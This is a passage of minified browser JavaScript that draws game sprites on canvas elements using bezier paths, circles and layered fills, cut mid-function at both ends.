                    r.bezierCurveTo(244 * e, 214 * e, 247 * e, 213 * e, 263 * e, 229 * e),
                    r.bezierCurveTo(295 * e, 220 * e, 291 * e, 215 * e, 301 * e, 194 * e),
                    r.bezierCurveTo(308 * e, 178 * e, 309 * e, 176 * e, 302 * e, 173 * e),
                    r.bezierCurveTo(290 * e, 177 * e, 289 * e, 177 * e, 283 * e, 169 * e),
                    r.bezierCurveTo(279 * e, 163 * e, 279 * e, 161 * e, 290 * e, 130 * e),
                    r.bezierCurveTo(270 * e, 127 * e, 270 * e, 127 * e, 250 * e, 124 * e),
                    r.bezierCurveTo(209 * e, 137.5 * e, 209 * e, 137.5 * e, 168 * e, 151 * e),
                    r.bezierCurveTo(121 * e, 135 * e, 121 * e, 135 * e, 74 * e, 119 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.globalCompositeOperation = "destination-out",
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(133 * e, 158 * e),
                    r.bezierCurveTo(152 * e, 193 * e, 158 * e, 205 * e, 140 * e, 203 * e),
                    r.bezierCurveTo(99 * e, 195 * e, 96 * e, 189 * e, 86 * e, 173 * e),
                    r.bezierCurveTo(80 * e, 159 * e, 88 * e, 145 * e, 104 * e, 141 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(215 * e, 146 * e),
                    r.bezierCurveTo(204 * e, 167 * e, 204 * e, 167 * e, 193 * e, 188 * e),
                    r.bezierCurveTo(187 * e, 201 * e, 191 * e, 209 * e, 213 * e, 201 * e),
                    r.bezierCurveTo(247 * e, 192 * e, 253 * e, 181 * e, 257 * e, 169 * e),
                    r.bezierCurveTo(260 * e, 157 * e, 254 * e, 149 * e, 243 * e, 141 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 8 * e),
                    r.globalCompositeOperation = "source-over",
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(133 * e, 158 * e),
                    r.bezierCurveTo(152 * e, 193 * e, 158 * e, 205 * e, 140 * e, 203 * e),
                    r.bezierCurveTo(99 * e, 195 * e, 96 * e, 189 * e, 86 * e, 173 * e),
                    r.bezierCurveTo(80 * e, 159 * e, 88 * e, 145 * e, 104 * e, 141 * e),
                    r.closePath(),
                    he(r, void 0, i[8], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(215 * e, 146 * e),
                    r.bezierCurveTo(204 * e, 167 * e, 204 * e, 167 * e, 193 * e, 188 * e),
                    r.bezierCurveTo(187 * e, 201 * e, 191 * e, 209 * e, 213 * e, 201 * e),
                    r.bezierCurveTo(247 * e, 192 * e, 253 * e, 181 * e, 257 * e, 169 * e),
                    r.bezierCurveTo(260 * e, 157 * e, 254 * e, 149 * e, 243 * e, 141 * e),
                    r.closePath(),
                    he(r, void 0, i[8], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(39 * e, 66 * e),
                    r.bezierCurveTo(57 * e, 107 * e, 63 * e, 96 * e, 120 * e, 106 * e),
                    r.bezierCurveTo(154 * e, 112 * e, 163 * e, 116 * e, 174 * e, 135 * e),
                    r.bezierCurveTo(180 * e, 109 * e, 191 * e, 113 * e, 237 * e, 103 * e),
                    r.bezierCurveTo(276 * e, 100 * e, 289 * e, 94 * e, 301 * e, 67 * e),
                    r.bezierCurveTo(317 * e, 112 * e, 301 * e, 141 * e, 274 * e, 139 * e),
                    r.bezierCurveTo(204 * e, 166 * e, 197 * e, 169 * e, 173 * e, 183 * e),
                    r.bezierCurveTo(170 * e, 183 * e, 170 * e, 183 * e, 167 * e, 183 * e),
                    r.bezierCurveTo(132 * e, 160 * e, 112 * e, 156 * e, 73 * e, 141 * e),
                    r.bezierCurveTo(43 * e, 146 * e, 27 * e, 120 * e, 39 * e, 66 * e),
                    r.closePath(),
                    he(r, i[7], i[8], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 185 * e),
                    r.bezierCurveTo(115 * e, 200 * e, 118 * e, 206 * e, 124 * e, 212 * e),
                    r.bezierCurveTo(133 * e, 223 * e, 132 * e, 231 * e, 121 * e, 230 * e),
                    r.bezierCurveTo(108 * e, 226 * e, 108 * e, 215 * e, 107 * e, 209 * e),
                    r.bezierCurveTo(106 * e, 201 * e, 110 * e, 196 * e, 114 * e, 185 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(226 * e, 186 * e),
                    r.bezierCurveTo(234 * e, 201 * e, 238 * e, 209 * e, 228 * e, 225 * e),
                    r.bezierCurveTo(223 * e, 233 * e, 213 * e, 233 * e, 211 * e, 226 * e),
                    r.bezierCurveTo(206 * e, 219 * e, 217 * e, 216 * e, 221 * e, 207 * e),
                    r.bezierCurveTo(225 * e, 196 * e, 225 * e, 191 * e, 226 * e, 186 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(172 * e, 110 * e),
                    r.bezierCurveTo(189 * e, 153 * e, 192 * e, 160 * e, 188 * e, 175 * e),
                    r.bezierCurveTo(183 * e, 190 * e, 176 * e, 197 * e, 165 * e, 191 * e),
                    r.bezierCurveTo(153 * e, 181 * e, 152 * e, 166 * e, 157 * e, 151 * e),
                    r.bezierCurveTo(164.5 * e, 131 * e, 164.5 * e, 131 * e, 172 * e, 111 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    n
            }
            function Ti(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 149 * e,
                    i.height = 153 * e,
                    n.globalAlpha = .5,
                    ke(n, 74.5 * e, 85 * e, 66 * e),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    ke(n, 75.5 * e, 72.5 * e, 67 * e),
                    he(n, t[1], t[2], 4 * e),
                    ke(n, 75.5 * e, 73.5 * e, 54 * e),
                    he(n, t[3]),
                    n.globalAlpha = .5,
                    ke(n, 74.5 * e, 80.5 * e, 39 * e),
                    he(n, t[4]),
                    n.globalAlpha = 1,
                    ke(n, 74.5 * e, 74.5 * e, 37 * e),
                    he(n, t[5]),
                    i
            }
            function Ai(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 173 * e,
                    i.height = 178 * e,
                    n.globalAlpha = .5,
                    ke(n, 86.5 * e, 98 * e, 80 * e),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    ke(n, 86.5 * e, 89 * e, 81 * e),
                    he(n, t[1], t[2], 4 * e),
                    ke(n, 86.5 * e, 86 * e, 59 * e),
                    he(n, t[3], t[4], 4 * e),
                    n.globalAlpha = .5,
                    ke(n, 86.5 * e, 95 * e, 34 * e),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    ke(n, 86.5 * e, 89 * e, 34 * e),
                    he(n, t[5]),
                    i
            }
            function hi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 253 * e,
                    i.height = 260 * e,
                    n.globalAlpha = .5,
                    ke(n, 126.5 * e, 134 * e, 119 * e),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    ke(n, 126.5 * e, 124 * e, 119 * e),
                    he(n, t[1], t[2], 4 * e),
                    ke(n, 126.5 * e, 127 * e, 100 * e),
                    he(n, t[3]),
                    n.globalAlpha = .5,
                    ke(n, 126.5 * e, 135 * e, 81 * e),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    ke(n, 126.5 * e, 125 * e, 84 * e),
                    he(n, t[4], t[5], 4 * e),
                    ke(n, 126.5 * e, 125 * e, 61 * e),
                    he(n, t[6], t[7], 4 * e),
                    n.globalAlpha = .5,
                    ke(n, 126.5 * e, 134 * e, 40 * e),
                    he(n, t[8]),
                    n.globalAlpha = 1,
                    ke(n, 126.5 * e, 125 * e, 40 * e),
                    he(n, t[9]),
                    i
            }
            function li(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 139 * e,
                    n.height = 135 * e,
                    r.translate(0, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 77 * e),
                    r.bezierCurveTo(6 * e, 41 * e, 6 * e, 33 * e, 12 * e, 27 * e),
                    r.bezierCurveTo(27 * e, 6 * e, 28 * e, 6 * e, 37 * e, 6 * e),
                    r.bezierCurveTo(62 * e, 3 * e, 64 * e, 5 * e, 67 * e, 13 * e),
                    r.bezierCurveTo(80 * e, 36 * e, 73.5 * e, 25 * e, 80 * e, 37 * e),
                    r.bezierCurveTo(73.5 * e, 54 * e, 65 * e, 74 * e, 67 * e, 71 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(65 * e, 37 * e),
                    r.bezierCurveTo(105 * e, 40 * e, 113 * e, 39 * e, 117 * e, 48 * e),
                    r.bezierCurveTo(126 * e, 70 * e, 128 * e, 72 * e, 124 * e, 80 * e),
                    r.bezierCurveTo(112 * e, 101 * e, 110 * e, 104 * e, 99 * e, 104 * e),
                    r.bezierCurveTo(59 * e, 100 * e, 55 * e, 99 * e, 56 * e, 99 * e),
                    r.bezierCurveTo(47.5 * e, 79 * e, 45 * e, 66 * e, 39 * e, 59 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 63 * e),
                    r.bezierCurveTo(5 * e, 99 * e, 5 * e, 101 * e, 8 * e, 103 * e),
                    r.bezierCurveTo(19 * e, 123 * e, 22 * e, 125 * e, 28 * e, 126 * e),
                    r.bezierCurveTo(57 * e, 127 * e, 55 * e, 127 * e, 58 * e, 120 * e),
                    r.bezierCurveTo(82 * e, 86 * e, 83 * e, 78 * e, 82 * e, 87 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, -10 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(32 * e, 77 * e),
                    r.bezierCurveTo(6 * e, 41 * e, 6 * e, 33 * e, 12 * e, 27 * e),
                    r.bezierCurveTo(27 * e, 6 * e, 28 * e, 6 * e, 37 * e, 6 * e),
                    r.bezierCurveTo(62 * e, 3 * e, 64 * e, 5 * e, 67 * e, 13 * e),
                    r.bezierCurveTo(80 * e, 36 * e, 73.5 * e, 25 * e, 80 * e, 37 * e),
                    r.bezierCurveTo(73.5 * e, 54 * e, 65 * e, 74 * e, 67 * e, 71 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(65 * e, 37 * e),
                    r.bezierCurveTo(105 * e, 40 * e, 113 * e, 39 * e, 117 * e, 48 * e),
                    r.bezierCurveTo(126 * e, 70 * e, 128 * e, 72 * e, 124 * e, 80 * e),
                    r.bezierCurveTo(112 * e, 101 * e, 110 * e, 104 * e, 99 * e, 104 * e),
                    r.bezierCurveTo(59 * e, 100 * e, 55 * e, 99 * e, 56 * e, 99 * e),
                    r.bezierCurveTo(47.5 * e, 79 * e, 45 * e, 66 * e, 39 * e, 59 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 63 * e),
                    r.bezierCurveTo(5 * e, 99 * e, 5 * e, 101 * e, 8 * e, 103 * e),
                    r.bezierCurveTo(19 * e, 123 * e, 22 * e, 125 * e, 28 * e, 126 * e),
                    r.bezierCurveTo(57 * e, 127 * e, 55 * e, 127 * e, 58 * e, 120 * e),
                    r.bezierCurveTo(82 * e, 86 * e, 83 * e, 78 * e, 82 * e, 87 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80 * e, 38 * e),
                    r.bezierCurveTo(72.5 * e, 52 * e, 72.5 * e, 52 * e, 65 * e, 66 * e),
                    r.bezierCurveTo(47.5 * e, 37 * e, 47.5 * e, 37 * e, 30 * e, 7 * e),
                    r.bezierCurveTo(48 * e, 4 * e, 57 * e, 4 * e, 64 * e, 10 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(65 * e, 65 * e),
                    r.bezierCurveTo(125 * e, 73 * e, 95.5 * e, 69 * e, 126 * e, 73 * e),
                    r.bezierCurveTo(119 * e, 98 * e, 106 * e, 104 * e, 98 * e, 103 * e),
                    r.bezierCurveTo(84.5 * e, 102 * e, 84.5 * e, 102 * e, 71 * e, 101 * e),
                    r.bezierCurveTo(64 * e, 86 * e, 64 * e, 86 * e, 57 * e, 70 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(27 * e, 69 * e),
                    r.bezierCurveTo(64 * e, 65 * e, 46 * e, 67 * e, 65 * e, 65 * e),
                    r.bezierCurveTo(43.5 * e, 94 * e, 43.5 * e, 94 * e, 22 * e, 123 * e),
                    r.bezierCurveTo(8 * e, 103 * e, 8 * e, 103 * e, 9 * e, 103 * e),
                    r.bezierCurveTo(5 * e, 98 * e, 11 * e, 89 * e, 26 * e, 70 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(26 * e, 69 * e),
                    r.bezierCurveTo(65 * e, 60 * e, 45 * e, 65 * e, 64 * e, 60 * e),
                    r.bezierCurveTo(63 * e, 65 * e, 63 * e, 65 * e, 62 * e, 70 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80 * e, 38 * e),
                    r.bezierCurveTo(68 * e, 70 * e, 75 * e, 53 * e, 70 * e, 68 * e),
                    r.bezierCurveTo(65 * e, 67 * e, 65 * e, 67 * e, 60 * e, 65 * e),
                    r.closePath(),
                    he(r, i[2]),
                    n
            }
            function Ii(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 100 * e,
                    i.height = 100 * e,
                    n.globalAlpha = .5,
                    n.fillStyle = t[0],
                    n.fillRect(0, 0, i.width, i.height),
                    i
            }
            function ci(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 120 * e,
                    i.height = 300 * e,
                    n.translate(-80 * e, -20),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(200.5 * e, 14.953125 * e),
                    n.bezierCurveTo(203 * e, 171.953125 * e, 203 * e, 171.953125 * e, 205.5 * e, 328.953125 * e),
                    n.bezierCurveTo(188.5 * e, 257.953125 * e, 164.5 * e, 216.953125 * e, 166.5 * e, 176.953125 * e),
                    n.bezierCurveTo(168.5 * e, 133.953125 * e, 198.5 * e, 98.953125 * e, 200.5 * e, 14.953125 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function Oi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 120 * e,
                    i.height = 300 * e,
                    n.translate(-200 * e, -40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(344 * e, 18.40625 * e),
                    n.bezierCurveTo(345 * e, 361.40625 * e, 344 * e, 191.40625 * e, 344 * e, 364.40625 * e),
                    n.bezierCurveTo(261 * e, 275.40625 * e, 274 * e, 259.40625 * e, 229 * e, 213.40625 * e),
                    n.bezierCurveTo(199 * e, 187.40625 * e, 222 * e, 133.40625 * e, 273 * e, 100.40625 * e),
                    n.bezierCurveTo(321 * e, 71.40625 * e, 327 * e, 34.40625 * e, 344 * e, 18.40625 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(335 * e, 38.072906494140625 * e),
                    n.bezierCurveTo(307 * e, 62.072906494140625 * e, 291 * e, 60.072906494140625 * e, 262 * e, 68.07290649414062 * e),
                    n.bezierCurveTo(223 * e, 80.07290649414062 * e, 225 * e, 111.07290649414062 * e, 264 * e, 139.07290649414062 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function gi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 120 * e,
                    i.height = 320 * e,
                    n.translate(-60 * e, -15 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(188.5 * e, 3.953125 * e),
                    n.bezierCurveTo(188.5 * e, 171.453125 * e, 188.5 * e, 171.453125 * e, 188.5 * e, 338.953125 * e),
                    n.bezierCurveTo(162.5 * e, 268.953125 * e, 145.5 * e, 265.953125 * e, 116.5 * e, 244.953125 * e),
                    n.bezierCurveTo(67.5 * e, 204.953125 * e, 87.5 * e, 160.953125 * e, 113.5 * e, 125.953125 * e),
                    n.bezierCurveTo(141.5 * e, 90.953125 * e, 176.5 * e, 56.953125 * e, 188.5 * e, 3.953125 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function pi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 120 * e,
                    i.height = 330 * e,
                    n.translate(-60 * e, -10 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(188.5 * e, 7.953125 * e),
                    n.bezierCurveTo(188.5 * e, 334.953125 * e, 188.5 * e, 332.953125 * e, 188.5 * e, 339.953125 * e),
                    n.bezierCurveTo(166.5 * e, 295.953125 * e, 145.5 * e, 295.953125 * e, 139.5 * e, 282.953125 * e),
                    n.bezierCurveTo(124.5 * e, 244.953125 * e, 139.5 * e, 243.953125 * e, 131.5 * e, 212.953125 * e),
                    n.bezierCurveTo(118.5 * e, 161.953125 * e, 69.5 * e, 156.953125 * e, 74.5 * e, 92.953125 * e),
                    n.bezierCurveTo(85.5 * e, 41.953125 * e, 158.5 * e, 49.953125 * e, 188.5 * e, 7.953125 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function Ri(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 48 * e,
                    i.height = 47 * e,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(7.1875 * e, 25.434661865234375 * e),
                    n.bezierCurveTo(11.1875 * e, 13.434661865234375 * e, 18.1875 * e, 8.434661865234375 * e, 32.1875 * e, 10.434661865234375 * e),
                    n.bezierCurveTo(45.1875 * e, 14.434661865234375 * e, 41.1875 * e, 24.434661865234375 * e, 36.1875 * e, 30.434661865234375 * e),
                    n.bezierCurveTo(22.1875 * e, 42.434661865234375 * e, 2.1875 * e, 41.434661865234375 * e, 7.1875 * e, 25.434661865234375 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function Ci(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 120 * e,
                    i.height = 280 * e,
                    n.translate(-100 * e, -20 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(228.5 * e, 331.953125 * e),
                    n.bezierCurveTo(228.5 * e, 12.953125 * e, 228.5 * e, 171.453125 * e, 228.5 * e, 10.953125 * e),
                    n.bezierCurveTo(196.5 * e, 76.953125 * e, 206.5 * e, 78.953125 * e, 191.5 * e, 114.953125 * e),
                    n.bezierCurveTo(162.5 * e, 170.953125 * e, 206.5 * e, 220.953125 * e, 210.5 * e, 251.953125 * e),
                    n.bezierCurveTo(218.5 * e, 287.953125 * e, 220.5 * e, 291.953125 * e, 228.5 * e, 331.953125 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function bi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 33 * e,
                    i.height = 35 * e,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(12.75 * e, 7.1328125 * e),
                    n.bezierCurveTo(26.75 * e, 8.1328125 * e, 27.75 * e, 14.1328125 * e, 24.75 * e, 23.1328125 * e),
                    n.bezierCurveTo(19.75 * e, 31.1328125 * e, 15.75 * e, 33.1328125 * e, 6.75 * e, 26.1328125 * e),
                    n.bezierCurveTo(.75 * e, 19.1328125 * e, 4.75 * e, 8.1328125 * e, 12.75 * e, 7.1328125 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function Ni(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 20 * e,
                    i.height = 35 * e,
                    Ve(n, 0, 0, 20, 35, 7),
                    he(n, t[0]),
                    i
            }
            function Si(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 161 * e,
                    i.height = 190 * e,
                    n.globalAlpha = .5,
                    n.translate(0, 8),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(9 * e, 93 * e),
                    n.bezierCurveTo(17 * e, 95 * e, 19 * e, 95 * e, 21 * e, 95 * e),
                    n.bezierCurveTo(9 * e, 83 * e, 17 * e, 93 * e, 4 * e, 76 * e),
                    n.bezierCurveTo(11 * e, 75 * e, 11 * e, 75 * e, 18 * e, 75 * e),
                    n.bezierCurveTo(13 * e, 67 * e, 13 * e, 67 * e, 7 * e, 59 * e),
                    n.bezierCurveTo(14 * e, 59 * e, 14 * e, 59 * e, 21 * e, 59 * e),
                    n.bezierCurveTo(46 * e, 35 * e, 35 * e, 45 * e, 49 * e, 31 * e),
                    n.bezierCurveTo(53 * e, 24 * e, 51 * e, 21 * e, 51 * e, 16 * e),
                    n.bezierCurveTo(63 * e, 23 * e, 63 * e, 24 * e, 69 * e, 29 * e),
                    n.bezierCurveTo(76 * e, 7 * e, 75 * e, 11 * e, 76 * e, 6 * e),
                    n.bezierCurveTo(81 * e, 12 * e, 84 * e, 18 * e, 89 * e, 27 * e),
                    n.bezierCurveTo(95 * e, 25 * e, 100 * e, 16 * e, 105 * e, 14 * e),
                    n.bezierCurveTo(103 * e, 25 * e, 111 * e, 33 * e, 110 * e, 34 * e),
                    n.bezierCurveTo(123 * e, 48 * e, 123 * e, 48 * e, 136 * e, 62 * e),
                    n.bezierCurveTo(142 * e, 60 * e, 147 * e, 59 * e, 155 * e, 58 * e),
                    n.bezierCurveTo(147 * e, 65 * e, 147 * e, 65 * e, 139 * e, 73 * e),
                    n.bezierCurveTo(145 * e, 73 * e, 145 * e, 73 * e, 151 * e, 73 * e),
                    n.bezierCurveTo(145 * e, 80 * e, 145 * e, 80 * e, 138 * e, 87 * e),
                    n.bezierCurveTo(144 * e, 88 * e, 144 * e, 88 * e, 150 * e, 89 * e),
                    n.bezierCurveTo(125 * e, 103 * e, 125 * e, 125 * e, 113 * e, 141 * e),
                    n.bezierCurveTo(92 * e, 178 * e, 85 * e, 177 * e, 76 * e, 178 * e),
                    n.bezierCurveTo(64 * e, 179 * e, 51 * e, 164 * e, 35 * e, 131 * e),
                    n.bezierCurveTo(18 * e, 95 * e, 13 * e, 99 * e, 8 * e, 93 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.translate(0, -8),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(9 * e, 93 * e),
                    n.bezierCurveTo(17 * e, 95 * e, 19 * e, 95 * e, 21 * e, 95 * e),
                    n.bezierCurveTo(9 * e, 83 * e, 17 * e, 93 * e, 4 * e, 76 * e),
                    n.bezierCurveTo(11 * e, 75 * e, 11 * e, 75 * e, 18 * e, 75 * e),
                    n.bezierCurveTo(13 * e, 67 * e, 13 * e, 67 * e, 7 * e, 59 * e),
                    n.bezierCurveTo(14 * e, 59 * e, 14 * e, 59 * e, 21 * e, 59 * e),
                    n.bezierCurveTo(46 * e, 35 * e, 35 * e, 45 * e, 49 * e, 31 * e),
                    n.bezierCurveTo(53 * e, 24 * e, 51 * e, 21 * e, 51 * e, 16 * e),
                    n.bezierCurveTo(63 * e, 23 * e, 63 * e, 24 * e, 69 * e, 29 * e),
                    n.bezierCurveTo(76 * e, 7 * e, 75 * e, 11 * e, 76 * e, 6 * e),
                    n.bezierCurveTo(81 * e, 12 * e, 84 * e, 18 * e, 89 * e, 27 * e),
                    n.bezierCurveTo(95 * e, 25 * e, 100 * e, 16 * e, 105 * e, 14 * e),
                    n.bezierCurveTo(103 * e, 25 * e, 111 * e, 33 * e, 110 * e, 34 * e),
                    n.bezierCurveTo(123 * e, 48 * e, 123 * e, 48 * e, 136 * e, 62 * e),
                    n.bezierCurveTo(142 * e, 60 * e, 147 * e, 59 * e, 155 * e, 58 * e),
                    n.bezierCurveTo(147 * e, 65 * e, 147 * e, 65 * e, 139 * e, 73 * e),
                    n.bezierCurveTo(145 * e, 73 * e, 145 * e, 73 * e, 151 * e, 73 * e),
                    n.bezierCurveTo(145 * e, 80 * e, 145 * e, 80 * e, 138 * e, 87 * e),
                    n.bezierCurveTo(144 * e, 88 * e, 144 * e, 88 * e, 150 * e, 89 * e),
                    n.bezierCurveTo(125 * e, 103 * e, 125 * e, 125 * e, 113 * e, 141 * e),
                    n.bezierCurveTo(92 * e, 178 * e, 85 * e, 177 * e, 76 * e, 178 * e),
                    n.bezierCurveTo(64 * e, 179 * e, 51 * e, 164 * e, 35 * e, 131 * e),
                    n.bezierCurveTo(18 * e, 95 * e, 13 * e, 99 * e, 8 * e, 93 * e),
                    n.closePath(),
                    he(n, t[1]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(28 * e, 63 * e),
                    n.bezierCurveTo(23 * e, 54 * e, 24 * e, 47 * e, 26 * e, 37 * e),
                    n.bezierCurveTo(28 * e, 29 * e, 31 * e, 31 * e, 41 * e, 35 * e),
                    n.bezierCurveTo(52 * e, 45 * e, 55 * e, 51 * e, 57 * e, 53 * e),
                    n.bezierCurveTo(50 * e, 50 * e, 44 * e, 47 * e, 43 * e, 48 * e),
                    n.bezierCurveTo(43 * e, 52 * e, 43 * e, 52 * e, 42 * e, 57 * e),
                    n.bezierCurveTo(38 * e, 54 * e, 38 * e, 54 * e, 33 * e, 51 * e),
                    n.bezierCurveTo(34 * e, 56 * e, 34 * e, 56 * e, 34 * e, 61 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(99 * e, 55 * e),
                    n.bezierCurveTo(107 * e, 43 * e, 113 * e, 39 * e, 121 * e, 34 * e),
                    n.bezierCurveTo(130 * e, 29 * e, 130 * e, 34 * e, 130 * e, 42 * e),
                    n.bezierCurveTo(131 * e, 57 * e, 128 * e, 61 * e, 129 * e, 63 * e),
                    n.bezierCurveTo(124 * e, 62 * e, 124 * e, 62 * e, 119 * e, 61 * e),
                    n.bezierCurveTo(119 * e, 56 * e, 120 * e, 61 * e, 118 * e, 52 * e),
                    n.bezierCurveTo(115 * e, 55 * e, 111 * e, 59 * e, 111 * e, 58 * e),
                    n.bezierCurveTo(110 * e, 54 * e, 109 * e, 57 * e, 109 * e, 51 * e),
                    n.closePath(),
                    he(n, t[3]),
                    ke(n, 103 * e, 110 * e, 11 * e),
                    he(n, t[4]),
                    ke(n, 55 * e, 111 * e, 11 * e),
                    he(n, t[4]),
                    ke(n, 99 * e, 107 * e, 5 * e),
                    he(n, t[1]),
                    ke(n, 51 * e, 108 * e, 5 * e),
                    he(n, t[1]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(31 * e, 121 * e),
                    n.bezierCurveTo(45 * e, 128 * e, 51 * e, 133 * e, 53 * e, 141 * e),
                    n.bezierCurveTo(59 * e, 161 * e, 70 * e, 173 * e, 80 * e, 169 * e),
                    n.bezierCurveTo(89 * e, 172 * e, 99 * e, 149 * e, 107 * e, 133 * e),
                    n.bezierCurveTo(114 * e, 122 * e, 119 * e, 123 * e, 124 * e, 119 * e),
                    n.bezierCurveTo(109 * e, 148 * e, 117 * e, 133 * e, 109 * e, 147 * e),
                    n.bezierCurveTo(87 * e, 180 * e, 84 * e, 179 * e, 76 * e, 178 * e),
                    n.bezierCurveTo(49 * e, 173 * e, 44 * e, 149 * e, 31 * e, 121 * e),
                    n.closePath(),
                    he(n, t[5]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.translate(-2, 0),
                    n.moveTo(71 * e, 162 * e),
                    n.bezierCurveTo(80 * e, 155 * e, 85 * e, 159 * e, 89 * e, 164 * e),
                    n.bezierCurveTo(90 * e, 171 * e, 86 * e, 173 * e, 79 * e, 173 * e),
                    n.bezierCurveTo(67 * e, 172 * e, 67 * e, 168 * e, 71 * e, 162 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.translate(2, 0),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(9 * e, 93 * e),
                    n.bezierCurveTo(17 * e, 95 * e, 19 * e, 95 * e, 21 * e, 95 * e),
                    n.bezierCurveTo(9 * e, 83 * e, 17 * e, 93 * e, 4 * e, 76 * e),
                    n.bezierCurveTo(11 * e, 75 * e, 11 * e, 75 * e, 18 * e, 75 * e),
